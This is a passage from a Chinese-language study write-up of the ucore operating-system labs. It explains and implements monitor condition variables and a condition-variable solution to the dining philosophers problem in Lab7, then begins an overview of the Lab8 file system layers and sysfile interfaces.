class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">condvar</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;        <span class="hljs-comment">// 条件变量所对应的信号量</span><br>    <span class="hljs-keyword">int</span> count;              <span class="hljs-comment">// 等待当前条件变量的等待进程总数</span><br>    <span class="hljs-keyword">monitor_t</span> * owner;      <span class="hljs-comment">// 当前条件变量的父管程</span><br>&#125; <span class="hljs-keyword">condvar_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;      <span class="hljs-comment">// 管程锁，每次只能有一个进程执行管程代码。该值初始化为1</span><br>    <span class="hljs-keyword">semaphore_t</span> next;       <span class="hljs-comment">// the next semaphore is used to down the signaling proc itself, and the other OR wakeuped waiting proc should wake up the sleeped signaling proc.</span><br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped signaling proc</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// 当前管程中存放所有条件变量的数组</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><blockquote><p>注意：<code>monitor</code>结构中<code>next</code>信号量的功能请在下文结合<code>cond_signal</code>说明来理解。</p></blockquote></li><li><p>初始化管程时，函数<code>monitor_init</code>会初始化传入管程的相关成员变量，并为该管程设置多个条件变量并初始化。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Initialize monitor.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">monitor_init</span> <span class="hljs-params">(<span class="hljs-keyword">monitor_t</span> * mtp, <span class="hljs-keyword">size_t</span> num_cv)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    assert(num_cv&gt;<span class="hljs-number">0</span>);<br>    mtp-&gt;next_count = <span class="hljs-number">0</span>;<br>    mtp-&gt;cv = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">// 初始化管程锁为1</span><br>    sem_init(&amp;(mtp-&gt;mutex), <span class="hljs-number">1</span>); <span class="hljs-comment">//unlocked</span><br>    sem_init(&amp;(mtp-&gt;next), <span class="hljs-number">0</span>);<span class="hljs-comment">// 注意这里的0</span><br>    <span class="hljs-comment">// 分配当前管程内的条件变量</span><br>    mtp-&gt;cv =(<span class="hljs-keyword">condvar_t</span> *) kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">condvar_t</span>)*num_cv);<br>    assert(mtp-&gt;cv!=<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// 初始化管程内条件变量的各个属性</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;num_cv; i++)&#123;<br>        mtp-&gt;cv[i].count=<span class="hljs-number">0</span>;<br>        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="hljs-number">0</span>);<br>        mtp-&gt;cv[i].owner=mtp;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>当某个线程准备离开临界区、准备释放对应的条件变量时，线程会执行函数<code>cond_signal</code>。该函数同样是这次要实现的函数之一。</p><ul><li><p>如果<strong>不存在线程</strong>正在等待带释放的条件变量，则不执行任何操作</p></li><li><p>否则，对传入条件变量内置的信号执行V操作。注意：这一步可能会唤醒某个等待线程。</p></li><li><p><strong>关键的一步！</strong> 函数内部接下来会执行<code>down(&amp;(cvp-&gt;owner-&gt;next))</code>操作。由于<code>monitor::next</code>在初始化时就设置为<strong>0</strong>，所以当执行到该条代码时，无论如何，<strong>当前正在执行<code>cond_signal</code>函数的线程一定会被挂起</strong>。这也正是管程中<code>next</code>信号量的用途。</p><blockquote><p>为什么要做这一步呢？原因是<strong>保证管程代码的互斥访问</strong>。</p><p>一个简单的例子：线程1因等待条件变量a而挂起，过了一段时间，线程2释放条件变量a，此时线程1被唤醒，并等待调度。注意！<strong>此时在管程代码中，存在两个活跃线程</strong>（这里的活跃指的是正在运行/就绪线程），而这<strong>违背了管程的互斥性</strong>。因此，线程2在释放条件变量a后应当<strong>立即挂起</strong>以保证管程代码互斥。而<code>next</code>信号量便是帮助线程2立即挂起的一个信号。</p></blockquote></li></ul><p>以下是该函数的实现代码：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Unlock one of threads waiting on the condition variable.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cond_signal</span> <span class="hljs-params">(<span class="hljs-keyword">condvar_t</span> *cvp)</span> </span>&#123;<br>   <span class="hljs-comment">//LAB7 EXERCISE1: YOUR CODE</span><br>   cprintf(<span class="hljs-string">&quot;cond_signal begin: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);  <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">   *      cond_signal(cv) &#123;</span><br><span class="hljs-comment">   *          if(cv.count&gt;0) &#123;</span><br><span class="hljs-comment">   *             mt.next_count ++;</span><br><span class="hljs-comment">   *             signal(cv.sem);</span><br><span class="hljs-comment">   *             wait(mt.next);</span><br><span class="hljs-comment">   *             mt.next_count--;</span><br><span class="hljs-comment"> *          &#125;</span><br><span class="hljs-comment">   *       &#125;</span><br><span class="hljs-comment">   */</span><br>    <span class="hljs-keyword">if</span>(cvp-&gt;count&gt;<span class="hljs-number">0</span>) &#123;<br>        cvp-&gt;owner-&gt;next_count ++;<br>        up(&amp;(cvp-&gt;sem));<br>        down(&amp;(cvp-&gt;owner-&gt;next));<br>        cvp-&gt;owner-&gt;next_count --;<br>   &#125;<br>   cprintf(<span class="hljs-string">&quot;cond_signal end: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>当某个线程需要等待锁时，则会执行<code>cond_wait</code>函数。而该函数是我们这次要实现的函数之一。</p><ul><li><p>当某个线程因为等待条件变量而<strong>准备</strong>将<strong>自身挂起</strong>前，此时条件变量中的<code>count</code>变量应自增1。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cvp-&gt;count++;<br></code></pre></div></td></tr></table></figure></li><li><p>之后当前进程应该释放<strong>所等待的条件变量所属的管程互斥锁</strong>，以便于让其他线程执行管程代码。</p><p>但如果存在一个已经在管程中、但因为执行<code>cond_signal</code>而挂起的线程，则优先继续执行该线程。</p><blockquote><p>有关“因为执行<code>cond_signal</code>而挂起的线程”的详细信息，请阅读上方<code>cond_signal</code>函数的介绍来了解。</p></blockquote><p>如果程序选择执行<code>up(&amp;(cvp-&gt;owner-&gt;next))</code>，请注意：<strong>此时mutex没有被释放</strong>。因为当前线程将被挂起，原先存在于管程中的线程被唤醒，此时管程中仍然只有一个活跃线程，不需要让新的线程进入管程。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="hljs-number">0</span>)<br>    up(&amp;(cvp-&gt;owner-&gt;next));<br><span class="hljs-keyword">else</span><br>    up(&amp;(cvp-&gt;owner-&gt;mutex));<br></code></pre></div></td></tr></table></figure></li><li><p>释放管程后，尝试获取该条件变量。如果获取失败，则当前线程将在<code>down</code>函数的内部被挂起。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">down(&amp;(cvp-&gt;sem));<br></code></pre></div></td></tr></table></figure></li><li><p>若当前线程成功获取条件变量，则当前等待条件变量的线程数减一。</p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">cvp</span>-&gt;count<span class="hljs-comment">--;</span><br></code></pre></div></td></tr></table></figure></li></ul><p>以下是最终代码：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Suspend calling thread on a condition variable waiting for condition Atomically unlocks</span><br><span class="hljs-comment">// mutex and suspends calling thread on conditional variable after waking up locks mutex. Notice: mp is mutex semaphore for monitor&#x27;s procedures</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">cond_wait</span> <span class="hljs-params">(<span class="hljs-keyword">condvar_t</span> *cvp)</span> </span>&#123;<br>    <span class="hljs-comment">//LAB7 EXERCISE1: YOUR CODE</span><br>    cprintf(<span class="hljs-string">&quot;cond_wait begin:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);<br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment">    *         cv.count ++;</span><br><span class="hljs-comment">    *         if(mt.next_count&gt;0)</span><br><span class="hljs-comment">    *            signal(mt.next)</span><br><span class="hljs-comment">    *         else</span><br><span class="hljs-comment">    *            signal(mt.mutex);</span><br><span class="hljs-comment">    *         wait(cv.sem);</span><br><span class="hljs-comment">    *         cv.count --;</span><br><span class="hljs-comment">    */</span><br>    cvp-&gt;count++;<br>    <span class="hljs-keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="hljs-number">0</span>)<br>        up(&amp;(cvp-&gt;owner-&gt;next));<br>    <span class="hljs-keyword">else</span><br>        up(&amp;(cvp-&gt;owner-&gt;mutex));<br>    down(&amp;(cvp-&gt;sem));<br>    cvp-&gt;count--;<br><br>    cprintf(<span class="hljs-string">&quot;cond_wait end:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>管程中函数的入口出口设计</p><ul><li><p>为了让整个管程正常运行，还需在管程中的每个函数的入口和出口增加相关操作，即：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">monitorFunc</span><span class="hljs-params">()</span> </span>&#123;<br>     down(&amp;(mtp-&gt;mutex));<br><span class="hljs-comment">//--------into routine in monitor--------------</span><br>      <span class="hljs-comment">// ...</span><br><span class="hljs-comment">//--------leave routine in monitor--------------</span><br>      <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>         up(&amp;(mtp-&gt;next));<br>      <span class="hljs-keyword">else</span><br>         up(&amp;(mtp-&gt;mutex));<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>这样做的好处有两个</p><ul><li>只有一个进程在执行管程中的函数。</li><li>避免由于执行了<code>cond_signal</code>函数而睡眠的进程无法被唤醒。</li></ul></li><li><p>针对 <strong>“避免由于执行了<code>cond_signal</code>函数而睡眠的进程无法被唤醒“</strong> 这个优点简单说一下</p><ul><li>管程中<code>wait</code>和<code>signal</code>函数的调用存在时间顺序。例如：当线程1先调用<code>signal</code>唤醒线程2并将自身线程挂起后，线程2在开始执行时将无法唤醒原先的在<code>signal</code>中挂起的线程1。</li><li>也就是说，<strong>只要存在线程在管程中执行了<code>signal</code>，那么至少存在一个线程在管程中被挂起</strong>。</li><li>此时，就只能在临界区外唤醒挂起的线程1，而这一步在代码中也得到了实现。</li></ul></li></ul></li></ul><blockquote><p>请在实验报告中给出给用户态进程/线程提供信号量机制的设计方案，并比较说明给内核级提供信号量机制的异同。</p></blockquote><p>用户态进程/线程的信号量机制可以沿用内核级信号量的实现，增加一下接口用于调用即可：</p><p>应该首先通过系统调用进行sem的初始化，设置sem.value以及sem.wait_queue</p><ul><li><p>sem_post和sem_wait：P操作和V操作接口。</p></li><li><p>sem_get_value：获取信号量当前的值。</p></li><li><p>sem_close：删除调用进程与它之前打开的一个信号量之间的关联关系。</p></li><li><p>sem_del：删除一个信号量名字并将其标记为在所有进程关闭该信号量时删除该信号量。</p></li></ul><p>不同：在用户态使用信号量时，需要进行系统调用进入到内核态进行操作。</p><blockquote><ol><li>用管程机制实现哲学家就餐问题的解决方案（基于条件变量）</li></ol></blockquote><ul><li><p>这题涉及到了两个函数，分别是<code>phi_take_forks_condvar</code>和<code>phi_put_forks_condvar</code>。与信号量所实现的哲学家就餐问题类似，大体逻辑是一致的。</p></li><li><p>首先，哲学家需要尝试获取刀叉，如果刀叉没有获取到，则等待刀叉。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_take_forks_condvar</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> </span>&#123;<br>     down(&amp;(mtp-&gt;mutex));<br><span class="hljs-comment">//--------into routine in monitor--------------</span><br>     <span class="hljs-comment">// LAB7 EXERCISE1: YOUR CODE</span><br>     <span class="hljs-comment">// I am hungry</span><br>     state_condvar[i]=HUNGRY; <span class="hljs-comment">/* 记录下哲学家i饥饿的事实 */</span><br>     <span class="hljs-comment">// try to get fork</span><br>     phi_test_condvar(i);<br>     <span class="hljs-keyword">if</span> (state_condvar[i] != EATING) &#123;<br>          cprintf(<span class="hljs-string">&quot;phi_take_forks_condvar: %d didn&#x27;t get fork and will wait\n&quot;</span>,i);<br>          cond_wait(&amp;mtp-&gt;cv[i]);<br>      &#125;<br><span class="hljs-comment">//--------leave routine in monitor--------------</span><br>      <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>         up(&amp;(mtp-&gt;next));<br>      <span class="hljs-keyword">else</span><br>         up(&amp;(mtp-&gt;mutex));<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>之后，当哲学家放下刀叉时，如果左右两边的哲学家都满足条件可以进餐，则设置对应的条件变量。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_put_forks_condvar</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> </span>&#123;<br>     down(&amp;(mtp-&gt;mutex));<br><span class="hljs-comment">//--------into routine in monitor--------------</span><br>     <span class="hljs-comment">// LAB7 EXERCISE1: YOUR CODE</span><br>     <span class="hljs-comment">// I ate over</span><br>     state_condvar[i]=THINKING; <span class="hljs-comment">/* 哲学家进餐结束 */</span><br>     <span class="hljs-comment">// test left and right neighbors</span><br>     phi_test_condvar(LEFT); <span class="hljs-comment">/* 看一下左邻居现在是否能进餐 */</span><br>     phi_test_condvar(RIGHT); <span class="hljs-comment">/* 看一下右邻居现在是否能进餐 */</span><br><span class="hljs-comment">//--------leave routine in monitor--------------</span><br>     <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>        up(&amp;(mtp-&gt;next));<br>     <span class="hljs-keyword">else</span><br>        up(&amp;(mtp-&gt;mutex));<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>以下是哲学家尝试进餐的代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_test_condvar</span> <span class="hljs-params">(i)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(state_condvar[i]==HUNGRY&amp;&amp;state_condvar[LEFT]!=EATING<br>            &amp;&amp;state_condvar[RIGHT]!=EATING) &#123;<br>        cprintf(<span class="hljs-string">&quot;phi_test_condvar: state_condvar[%d] will eating\n&quot;</span>,i);<br>        state_condvar[i] = EATING ;<br>        cprintf(<span class="hljs-string">&quot;phi_test_condvar: signal self_cv[%d] \n&quot;</span>,i);<br>        cond_signal(&amp;mtp-&gt;cv[i]) ;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean">哲学家-&gt;试试拿刀叉-&gt;能拿-&gt;signal 唤醒被wait阻塞的进程-&gt;阻塞自己<br>                  |             |                   A<br>                  |             V                   |<br>                  -&gt;不能拿-&gt;wait阻塞自己             |<br>                                                    |<br>哲学家-&gt;放刀叉-&gt;让左右两边试试拿刀叉-&gt;有哲学家睡在signal 唤醒他<br></code></pre></div></td></tr></table></figure><blockquote><p>请在实验报告中回答：能否不用基于信号量机制来完成条件变量？如果不能，请给出理由，如果能，请给出设计说明和具体实现。</p></blockquote><p>自旋锁.</p></div><h1 id="Lab8"><a href="#Lab8" class="headerlink" title="Lab8"></a>Lab8</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目结构-1"><a href="#0-项目结构-1" class="headerlink" title="0.项目结构"></a>0.项目结构</h3><p>本次实验主要是理解kern/fs目录中的部分文件，并可用user/*.c测试所实现的Simple FS文件系统是否能够正常工作。本次实验涉及到的代码包括：</p><ul><li>文件系统测试用例： user/*.c：对文件系统的实现进行测试的测试用例；</li><li>通用文件系统接口<br>user/libs/file.[ch] | dir.[ch] | syscall.c：与文件系统操作相关的用户库实行；<br>kern/syscall.[ch]：文件中包含文件系统相关的内核态系统调用接口<br>kern/fs/sysfile.[ch]|file.[ch]：通用文件系统接口和实行</li><li>文件系统抽象层-VFS<br>kern/fs/vfs/*.[ch]：虚拟文件系统接口与实现</li><li>Simple FS文件系统<br>kern/fs/sfs/*.[ch]：SimpleFS文件系统实现</li><li>文件系统的硬盘IO接口<br>kern/fs/devs/dev.[ch] | dev_disk0.c：disk0硬盘设备提供给文件系统的I/O访问接口和实现</li><li>辅助工具<br>tools/mksfs.c：创建一个Simple FS文件系统格式的硬盘镜像。（<strong>理解此文件的实现细节对理解SFS文件系统很有帮助</strong>）</li><li>对内核其它模块的扩充<br>kern/process/proc.[ch]：增加成员变量 struct fs_struct *fs_struct，用于支持进程对文件的访问；重写了do_execve load_icode等函数以支持执行文件系统中的文件。<br>kern/init/init.c：增加调用初始化文件系统的函数fs_init。</li></ul><h3 id="1-ucore文件系统概述"><a href="#1-ucore文件系统概述" class="headerlink" title="1.ucore文件系统概述"></a>1.ucore文件系统概述</h3><p>ucore的文件系统模型源于Havard的OS161的文件系统和Linux文件系统。但其实这二者都是源于传统的UNIX文件系统设计。UNIX提出了四个文件系统抽象概念：文件(file)、目录项(dentry)、索引节点(inode)和安装点(mount point)。</p><ul><li><strong>文件</strong>：UNIX文件中的内容可理解为是一有序字节buffer，文件都有一个方便应用程序识别的文件名称（也称文件路径名）。典型的文件操作有读、写、创建和删除等。</li><li><strong>目录项</strong>：目录项不是目录（又称文件路径），而是目录的组成部分。在UNIX中目录被看作一种特定的文件，而目录项是文件路径中的一部分。如一个文件路径名是“/test/testfile”，则包含的目录项为：根目录“/”，目录“test”和文件“testfile”，这三个都是目录项。一般而言，目录项包含目录项的名字（文件名或目录名）和目录项的索引节点（见下面的描述）位置。</li><li><strong>索引节点</strong>：UNIX将文件的相关元数据信息（如访问控制权限、大小、拥有者、创建时间、数据内容等等信息）存储在一个单独的数据结构中，该结构被称为索引节点。</li><li><strong>安装点</strong>：在UNIX中，文件系统被安装在一个特定的文件路径位置，这个位置就是安装点。所有的已安装文件系统都作为根文件系统树中的叶子出现在系统中。</li></ul><p>上述抽象概念形成了UNIX文件系统的逻辑数据结构，并需要通过一个具体文件系统的架构设计与实现把上述信息映射并储存到磁盘介质上，从而在具体文件系统的磁盘布局（即数据在磁盘上的物理组织）上具体体现出上述抽象概念。比如文件元数据信息存储在磁盘块中的索引节点上。当文件被载入内存时，内核需要使用磁盘块中的索引点来构造内存中的索引节点。</p><p>ucore模仿了UNIX的文件系统设计，ucore的文件系统架构主要由四部分组成：</p><ul><li><strong>通用文件系统访问接口层</strong>：该层提供了一个从用户空间到文件系统的标准访问接口。这一层访问接口让应用程序能够通过一个简单的接口获得ucore内核的文件系统服务。</li><li><strong>文件系统抽象层</strong>：向上提供一个一致的接口给内核其他部分（文件系统相关的系统调用实现模块和其他内核功能模块）访问。向下提供一个同样的抽象函数指针列表和数据结构屏蔽不同文件系统的实现细节。</li><li><strong>Simple FS文件系统层</strong>：一个基于索引方式的简单文件系统实例。向上通过各种具体函数实现以对应文件系统抽象层提出的抽象函数。向下访问外设接口</li><li><strong>外设接口层</strong>：向上提供device访问接口屏蔽不同硬件细节。向下实现访问各种具体设备驱动的接口，比如disk设备接口/串口设备接口/键盘设备接口等。</li></ul><p>文件系统的访问处理过程: 假如应用程序操作文件（打开/创建/删除/读写），首先需要通过文件系统的通用文件系统访问接口层给用户空间提供的访问接口进入文件系统内部，接着由文件系统抽象层把访问请求转发给某一具体文件系统（比如SFS文件系统），具体文件系统（Simple FS文件系统层）把应用程序的访问请求转化为对磁盘上的block的处理请求，并通过外设接口层交给磁盘驱动例程来完成具体的磁盘操作。结合用户态写文件函数write的整个执行过程，我们可以比较清楚地看出ucore文件系统架构的层次和依赖关系。</p><p><img src="../../image/ucore/image001.png" alt="image"></p><h4 id="自上而下的数据结构"><a href="#自上而下的数据结构" class="headerlink" title="自上而下的数据结构"></a>自上而下的数据结构</h4><p>从ucore操作系统不同的角度来看，ucore中的文件系统架构包含四类主要的数据结构, 它们分别是：</p><ul><li>超级块（SuperBlock），它主要从文件系统的全局角度描述特定文件系统的全局信息。它的作用范围是整个OS空间。</li><li>索引节点（inode）：它主要从文件系统的单个文件的角度它描述了文件的各种属性和数据所在位置。它的作用范围是整个OS空间。</li><li>目录项（dentry）：它主要从文件系统的文件路径的角度描述了文件路径中的一个特定的目录项（注：一系列目录项形成目录/文件路径）。它的作用范围是整个OS空间。对于SFS而言，inode(具体为struct sfs_disk_inode)对应于物理磁盘上的具体对象，dentry（具体为struct sfs_disk_entry）是一个内存实体，其中的ino成员指向对应的inode number，另外一个成员是file name(文件名).</li><li>文件（file），它主要从进程的角度描述了一个进程在访问文件时需要了解的文件标识，文件读写的位置，文件引用情况等信息。它的作用范围是某一具体进程。</li></ul><p>如果一个用户进程打开了一个文件，那么在ucore中涉及的相关数据结构和关系如下图所示：</p><p><img src="../../image/ucore/image-20220105195357089.png" alt="image-20220105195357089"></p><p>understand生成的关系图:</p><p><img src="../../image/ucore/image-20220105200433737.png" alt="image-20220105200433737"></p><h3 id="2-系统访问接口层"><a href="#2-系统访问接口层" class="headerlink" title="2.系统访问接口层"></a>2.系统访问接口层</h3><p>从用户态函数syscall-&gt;sys_open(syscall.c)-&gt;sysfile_open(sysfile.c)中:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;     <span class="hljs-comment">// Open or create a file. FLAGS/MODE per the syscall.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;                                      <span class="hljs-comment">// Close a vnode opened  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len)</span></span>;               <span class="hljs-comment">// Read file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len)</span></span>;              <span class="hljs-comment">// Write file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> pos, <span class="hljs-keyword">int</span> whence)</span></span>;                <span class="hljs-comment">// Seek file  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat *stat)</span></span>;                   <span class="hljs-comment">// Stat file </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_fsync</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;                                      <span class="hljs-comment">// Sync file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_chdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                            <span class="hljs-comment">// change DIR  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_mkdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                            <span class="hljs-comment">// create DIR</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_link</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path2)</span></span>;         <span class="hljs-comment">// set a path1&#x27;s link as path2</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_rename</span><span class="hljs-params">(<span class="hljs-keyword">const</span> 